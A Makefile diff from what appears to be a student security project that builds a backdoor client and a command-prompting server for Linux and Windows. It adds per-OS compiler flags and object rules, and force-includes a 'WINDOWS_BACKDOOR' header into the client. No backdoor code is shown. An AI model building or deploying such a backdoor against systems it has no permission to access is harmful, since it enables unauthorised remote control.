@@ -6,7 +6,7 @@
 #    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
-#    Updated: 2026/01/11 16:10:41 by joesanto         ###   ########.fr        #
+#    Updated: 2026/01/11 16:54:42 by joesanto         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -17,6 +17,7 @@ WIN_AR = x86_64-w64-mingw32-ar rcs
 WINDOWS_LINKING = -lws2_32
 
 FLAGS = -Wall -Wextra -Werror -g
+WINDOWS_FLAGS = -Wall -Wextra -Werror
 SRCS_DIR = srcs
 INFECT_PROGRAM = $(SRCS_DIR)/program_test.c
 INCLUDES = -Iincludes
@@ -68,20 +69,25 @@ WINDOWS_CLIENT_OBJS += $(WINDOWS_CLIENT_CONNECTION_SRCS:.c=.o)
 SERVER_DIR = $(SRCS_DIR)/server
 PROMPT_COMMAND_DIR = $(SERVER_DIR)/prompt_command
 SERVER_CONNECTION_DIR = $(SERVER_DIR)/socket_server_connection
-PROMPT_COMMAND = $(addprefix $(PROMPT_COMMAND_DIR)/, prompt_command.c receive_command_output.c)
+
+PROMPT_COMMAND = $(addprefix $(PROMPT_COMMAND_DIR)/, prompt_command_sharedOS.c \
+				 receive_command_output_sharedOS.c \
+)
 INCLUDES += -I$(PROMPT_COMMAND_DIR)/includes
 
 # (LINUX)
+LINUX_PROMPT_COMMAND_OBJS = $(addsuffix _linux.o, $(basename $(PROMPT_COMMAND)))
 LINUX_SERVER_MAIN = $(SERVER_DIR)/berkeley_server.c
 LINUX_SERVER_CONNECTION_SRCS = $(SERVER_CONNECTION_DIR)/berkeley_server_connection.c
 LINUX_SERVER_OBJS += $(LINUX_SERVER_MAIN:.c=.o) $(LINUX_SERVER_CONNECTION_SRCS:.c=.o) \
-	$(PROMPT_COMMAND:.c=.o)
+	$(LINUX_PROMPT_COMMAND_OBJS)
 
 # (WINDOWS)
+WINDOWS_PROMPT_COMMAND_OBJS = $(addsuffix _windows.o, $(basename $(PROMPT_COMMAND)))
 WINDOWS_SERVER_MAIN = $(SERVER_DIR)/winsock_server.c
 WINDOWS_SERVER_CONNECTION_SRCS = $(SERVER_CONNECTION_DIR)/winsock_server_connection.c
 WINDOWS_SERVER_OBJS += $(WINDOWS_SERVER_MAIN:.c=.o) $(WINDOWS_SERVER_CONNECTION_SRCS:.c=.o) \
-	$(PROMPT_COMMAND:.c=.o)
+	$(WINDOWS_PROMPT_COMMAND_OBJS)
 
 # -------------------------------- COMPILATION ------------------------------- #
 
@@ -95,11 +101,13 @@ $(LINUX_CLIENT): $(LINUX_CLIENT_OBJS) $(INFECT_PROGRAM)
 	$(CC) $^ -o $@
 
 $(WINDOWS_SERVER): CC = $(MINGW)
+$(WINDOWS_SERVER): FLAGS = $(WINDOWS_FLAGS)
 $(WINDOWS_SERVER): AR = $(WIN_AR)
 $(WINDOWS_SERVER): $(WINDOWS_LIBFT) $(WINDOWS_SERVER_OBJS)
 	$(MINGW) $(WINDOWS_SERVER_OBJS) $(WINDOWS_LIBFT) -o $@ $(WINDOWS_LINKING)
 
 $(WINDOWS_CLIENT): CC = $(MINGW)
+$(WINDOWS_CLIENT): FLAGS = $(WINDOWS_FLAGS)
 $(WINDOWS_CLIENT): FLAGS += -include $(WINDOWS_BACKDOOR)
 $(WINDOWS_CLIENT): $(WINDOWS_CLIENT_OBJS) $(INFECT_PROGRAM)
 	$(MINGW) $^ -o $@ $(WINDOWS_LINKING)
@@ -108,7 +116,13 @@ $(WINDOWS_CLIENT): $(WINDOWS_CLIENT_OBJS) $(INFECT_PROGRAM)
 	@if [ ! -d "$(dir $@)" ]; then \
 		git clone git@github.com:joelsantossouza/libft.git $(dir $@); \
 	fi
-	make -C $(dir $@) CC="$(CC)" AR="$(AR)"
+	make -C $(dir $@) CC="$(CC)" AR="$(AR)" FLAGS="$(FLAGS)"
+
+%_sharedOS_linux.o: %_sharedOS.c
+	$(CC) $(FLAGS) $(INCLUDES) -c $< -o $@
+
+%_sharedOS_windows.o: %_sharedOS.c
+	$(CC) $(FLAGS) $(INCLUDES) -c $< -o $@
 
 %.o: %.c
 	$(CC) $(FLAGS) $(INCLUDES) -c $< -o $@
